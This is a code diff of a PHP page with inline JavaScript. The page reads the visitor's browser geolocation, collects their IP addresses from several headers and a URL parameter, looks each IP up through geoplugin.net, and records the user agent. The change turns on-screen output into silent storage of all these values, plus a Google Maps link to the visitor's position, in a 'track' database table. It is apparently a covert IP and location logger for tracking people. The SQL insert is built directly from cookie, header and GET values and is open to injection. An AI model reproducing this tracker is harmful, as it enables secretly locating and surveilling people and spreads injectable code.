@@ -1,5 +1,4 @@
-<script>
-navigator.geolocation.getCurrentPosition(function (position){var lat=position.coords.latitude;var lon=position.coords.longitude;document.cookie="lat=" + lat;document.cookie="lon=" + lon;});</script>
+<script>navigator.geolocation.getCurrentPosition(function (position){var lat=position.coords.latitude;var lon=position.coords.longitude;document.cookie="lat=" + lat;document.cookie="lon=" + lon;});</script>
 <?php
 $lat = NULL;
 $lon = NULL;
@@ -13,7 +12,28 @@ $ipa = NULL;
 $agent = NULL;
 $hagent = NULL;
 $gagent = NULL;
-
+$google = NULL;
+$clientv6 = NULL;
+$xforfv6 = NULL;
+$xforv6 = NULL;
+$forfv6 = NULL;
+$forv6 = NULL;
+$ipv6 = NULL;
+$ipav6 = NULL;
+$clientgeo = NULL;
+$xforfgeo = NULL;
+$xforgeo = NULL;
+$forfgeo = NULL;
+$forgeo = NULL;
+$ipgeo = NULL;
+$ipageo = NULL;
+$clientv6geo = NULL;
+$xforfv6geo = NULL;
+$xforv6geo = NULL;
+$forfv6geo = NULL;
+$forv6geo = NULL;
+$ipv6geo = NULL;
+$ipav6geo = NULL;
 global $HTTP_SERVER_VARS;
 global $HTTP_USER_AGENT;
 $lat = $_COOKIE['lat'];
@@ -28,63 +48,43 @@ $ipa = $_GET['addr'];
 $agent = $_SERVER['HTTP_USER_AGENT'];
 $hagent = $HTTP_SERVER_VARS['HTTP_USER_AGENT'];
 $gagent = $HTTP_USER_AGENT;
-
-echo $lat."<br />";
-echo $lon."<br />";
 if ($lon == NULL){header("Refresh:5");}else{
-echo "https://maps.google.com/maps?q=loc:".$lat."+".$lon."<br />";}
-
+$google = "https://maps.google.com/maps?q=loc:".$lat."+".$lon;}
 if ($client != NULL){
-echo $client."<br />";
 $clientv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_CLIENT_IP']);
-echo $clientv6."<br />";
-echo var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$client)))."<br />";
-echo var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$clientv6)))."<br />";}
-
+$clientgeo = var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$client)));
+$clientv6geo = var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$clientv6)));}
 if ($xforf != NULL){
-echo $xforf."<br />";
 $xforfv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_X_FORWARDED_FOR']);
-echo $xforfv6."<br />";
-echo var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforf)))."<br />";
-echo var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforfv6)))."<br />";}
-
+$xforfgeo = var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforf)));
+$xforfv6geo = var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforfv6)));}
 if ($xfor != NULL){
-echo $xfor."<br />";
 $xforv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_X_FORWARDED']);
-echo $xforv6."<br />";
-echo var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xfor)))."<br />";
-echo var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforv6)))."<br />";}
-
+$xforgeo = var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xfor)));
+$xforv6geo = var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforv6)));}
 if ($forf != NULL){
-echo $forf."<br />";
 $forfv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_FORWARDED_FOR']);
-echo $forfv6."<br />";
-echo var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forf)))."<br />";
-echo var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forfv6)))."<br />";}
-
+$forfgeo = var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forf)));
+$forfv6geo = var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forfv6)));}
 if ($for != NULL){
-echo $for."<br />";
 $forv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_FORWARDED']);
-echo $forv6."<br />";
-echo var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$for)))."<br />";
-echo var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forv6)))."<br />";}
-echo $for."<br />";
-
+$forgeo = var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$for)));
+$forv6geo = var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forv6)));}
 if ($ip != NULL){
-echo $ip."<br />";
 $ipv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['REMOTE_ADDR']);
-echo $ipv6."<br />";
-echo var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ip)))."<br />";
-echo var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipv6)))."<br />";}
-
+$ipgeo = var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ip)));
+$ipv6geo = var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipv6)));}
 if ($ipa != NULL){
-echo $ipa."<br />";
 $ipav6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_GET['addr']);
-echo $ipav6."<br />";
-echo var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipa)))."<br />";
-echo var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipav6)))."<br />";}
-
-echo $agent."<br />";
-echo $hagent."<br />";
-echo $gagent."<br />";
+$ipageo = var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipa)));
+$ipav6geo = var_export(unserialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipav6)));}
+include 'huMf6GwI0pbSg1k.php';
+$conn = OpenCon();
+$sql = "INSERT INTO track(client,xforf,xfor,forf,for,ip,ipa,lat,lon,google,clientv6,xforfv6,xforv6,forfv6,forv6,ipv6,ipav6,agent,hagent,gagent,clientgeo,xforfgeo,xforgeo,forfgeo,forgeo,ipgeo,ipageo,clientv6geo,xforfv6geo,xforv6geo,forfv6geo,forv6geo,ipv6geo,ipav6geo) VALUES (’$client','$xforf','$xfor','$forf','$for','$ip','$ipa','$lat','$lon','$google','$clientv6','$xforfv6','$xforv6','$forfv6','$forv6','$ipv6','$ipav6','$agent','$hagent','$gagent','$clientgeo','$xforfgeo','$xforgeo','$forfgeo','$forgeo','$ipgeo','$ipageo','$clientv6geo','$xforfv6geo','$xforv6geo','$forfv6geo','$forv6geo','$ipv6geo','$ipav6geo’)";
+if(mysqli_query($conn, $sql)){
+    echo "Records added successfully.";
+}else{
+    echo "ERROR: Could not able to execute $sql. " . mysqli_error($conn);
+}
+CloseCon($conn);
 ?>
